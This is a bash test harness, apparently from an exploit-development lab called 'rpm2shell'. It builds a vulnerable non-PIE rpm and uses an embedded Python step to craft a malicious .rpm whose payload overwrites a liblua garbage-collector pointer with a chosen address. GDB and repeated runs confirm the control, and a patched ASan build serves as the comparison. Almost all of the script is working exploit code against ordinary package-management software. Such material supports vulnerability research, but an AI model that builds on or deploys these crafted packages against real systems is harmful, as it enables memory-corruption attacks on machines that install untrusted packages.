#!/usr/bin/env bash
# ASLR-stable chosen-address control in a real rpm consumer: build the pinned
# vulnerable rpm without PIE, then let a crafted package overwrite a live
# liblua GC next pointer with a fixed .bss address. Under normal ASLR the
# chosen address is dereferenced by liblua's GC walk, and the process exits
# cleanly instead of faulting as it does with A filler. No forced call, no
# LD_PRELOAD, no command: this is a rung-4 mechanics result only.
#
# Usage from lab/frontier/rpm2shell:
#   bash real/run-nopie-target.sh
# Optional provisioning overrides:
#   RPM2SHELL_NOPIE_BIN=/path/to/rpm   reuse an already built non-PIE binary
#   RPM2SHELL_FIXED_BIN=/path/to/rpm   fixed ASan control binary
#   RPM_CONFIGDIR_VULN=DIR  vulnerable config dir; RPM_CONFIGDIR_FIXED=DIR
# In a clean archive, symlink src/rpm, src/rpm-fixed and deps/root as in
# real/run-real-witness.sh; install-vuln and build-fixed-asan can be supplied
# the same way or named through the two config overrides.
set -u
cd "$(dirname "$0")"
lane=$PWD
root=$(cd .. && pwd)

die() { echo "REFUSE: $*" >&2; exit 1; }

vuln_config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
[ -f "$vuln_config/rpmrc" ] || vuln_config=$root/build-vuln-plain
[ -f "$vuln_config/rpmrc" ] || die "vulnerable rpmrc missing"
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$fixed_config/rpmrc" ] || die "fixed rpmrc missing"
fixed=${RPM2SHELL_FIXED_BIN:-$root/build-fixed-asan/tools/rpm}
[ -x "$fixed" ] || die "fixed ASan binary missing"

bin=${RPM2SHELL_NOPIE_BIN:-}
if [ -z "$bin" ]; then
    build=$root/build-vuln-nopie
    if [ ! -x "$build/tools/rpm" ]; then
        export PKG_CONFIG_PATH="$root/deps/root/usr/lib/x86_64-linux-gnu/pkgconfig:$root/deps/root/usr/share/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
        cmake -S "$root/src/rpm" -B "$build" -G Ninja \
            -DCMAKE_BUILD_TYPE=Debug -DCMAKE_PREFIX_PATH="$root/deps/root" \
            -DWITH_SEQUOIA=OFF -DWITH_OPENSSL=ON -DWITH_ACL=OFF \
            -DWITH_AUDIT=OFF \
            -DMAGIC_LIBRARY="$root/deps/root/usr/lib/x86_64-linux-gnu/libmagic.so" \
            -DMAGIC_INCLUDE_DIR="$root/deps/root/usr/include" \
            -DSCDOC="$root/deps/root/usr/bin/scdoc" \
            -DWITH_CAP=OFF -DWITH_DBUS=OFF -DWITH_FAPOLICYD=OFF \
            -DWITH_LIBDW=OFF -DWITH_LIBELF=OFF -DWITH_READLINE=OFF \
            -DWITH_SELINUX=OFF -DENABLE_PYTHON=OFF -DENABLE_PLUGINS=OFF \
            -DENABLE_NLS=OFF -DENABLE_OPENMP=OFF -DENABLE_SQLITE=OFF \
            -DENABLE_BDB_RO=OFF -DENABLE_ASAN=OFF \
            -DCMAKE_INSTALL_PREFIX="$root/install-nopie" \
            -DCMAKE_C_FLAGS=-fno-pie -DCMAKE_CXX_FLAGS=-fno-pie \
            -DCMAKE_EXE_LINKER_FLAGS=-no-pie \
            > "$lane/nopie-configure.log" 2>&1 || {
                tail -n 30 "$lane/nopie-configure.log"; die "configure failed"; }
        cmake --build "$build" -j4 > "$lane/nopie-build.log" 2>&1 || {
            tail -n 40 "$lane/nopie-build.log"; die "build failed"; }
    fi
    bin=$build/tools/rpm
fi
[ -x "$bin" ] || die "non-PIE binary missing: $bin"

cfg=$(mktemp -d /tmp/r2s-cfg.XXXXX) || die "mktemp failed"
rmdir "$cfg" || die "rmdir failed"
ln -s "$vuln_config" "$cfg" || die "config symlink failed"

work=$lane/nopie
mkdir -p "$work"
if [ ! -f install/attack-reloc.rpm ]; then
    python3 make-attack.py safe.rpm attack.rpm safe-newc.rpm > make-attack.log || exit 1
    python3 relocate-install.py > install/generate.log || exit 1
fi

# The chosen address is the fixed .bss address of this pinned non-PIE build.
# GDB asserts below that it is the qword at buf+0x20 after the copy and that
# liblua visits it; a different build invalidates those assertions.
chosen=0x4063a0
python3 - "$chosen" <<'PY' || exit 1
from pathlib import Path
import struct
import sys
src = Path("install/attack-reloc.rpm").read_bytes()
needle = b"MISHE-RPM!!" + b"A" * 53
assert src.count(needle) == 1, "expected one 64-byte chosen payload"
addr = int(sys.argv[1], 16)
payload = b"MISHE-RPM!!" + b"A" * 21 + struct.pack("<Q", addr) + b"A" * 24
assert len(payload) == 64
Path("nopie/attack-bss.rpm").write_bytes(src.replace(needle, payload))
Path("nopie/attack-A.rpm").write_bytes(src)
PY

purge() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
fresh() { purge; rm -rf "$work/db"; mkdir -p "$work/db"; }
trap 'purge; rm -f "$cfg"' EXIT

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

file "$bin" | grep -q 'ELF 64-bit LSB executable' && \
    ok "vulnerable rpm binary is non-PIE" || bad "binary is not non-PIE"

args=(--dbpath "$work/db" -i --nodeps --noscripts --nodigest
      --nosignature --nofiledigest --ignoresize)

# Observation only: the debugger stops when liblua walks the chosen address;
# the plain runs below use the same fixture path and an unmodified process.
fresh
gdb -q -batch -ex "set environment RPM_CONFIGDIR $cfg" \
    -ex "set \$want = $chosen" -ex "directory $root/src/rpm/lib" \
    -x gc-pointer.gdb --args "$bin" "${args[@]}" \
    "$PWD/nopie/attack-bss.rpm" > "$work/gdb-bss.log" 2>&1
if grep -q "CHOSEN_PTR=$chosen .* MATCH=1" "$work/gdb-bss.log" && \
   grep -q "NEXT_AFTER=$chosen" "$work/gdb-bss.log"; then
    ok "chosen fixed qword is the live GC next pointer and is visited"
else
    bad "GDB did not observe the chosen qword at the GC visit"
fi

for i in 1 2 3 4 5; do
    fresh
    RPM_CONFIGDIR="$cfg" "$bin" "${args[@]}" \
        "$PWD/nopie/attack-bss.rpm" > "$work/plain-bss-$i.log" 2>&1
    rc=$?
    if [ "$rc" -eq 1 ] && ! grep -q 'AddressSanitizer' "$work/plain-bss-$i.log"; then
        ok "plain ASLR install with fixed chosen target $i rc=1 no fault"
    else
        bad "plain ASLR fixed-target $i rc=$rc"
    fi
done

for i in 1 2 3 4 5; do
    fresh
    RPM_CONFIGDIR="$cfg" "$bin" "${args[@]}" \
        "$PWD/nopie/attack-A.rpm" > "$work/plain-A-$i.log" 2>&1
    rc=$?
    if [ "$rc" -eq 139 ]; then
        ok "plain ASLR install with A filler $i rc=139"
    else
        bad "plain ASLR A-filler $i rc=$rc"
    fi
done

fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed" "${args[@]}" "$PWD/nopie/attack-bss.rpm" \
    > "$work/fixed-asan-bss.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$work/fixed-asan-bss.log"; then
    ok "fixed ASan build rejects the same fixture cleanly"
else
    bad "fixed ASan control rc=$rc"
fi

echo "NOPIE_TARGET_PASS=$pass NOPIE_TARGET_FAIL=$fail"
[ "$fail" -eq 0 ]
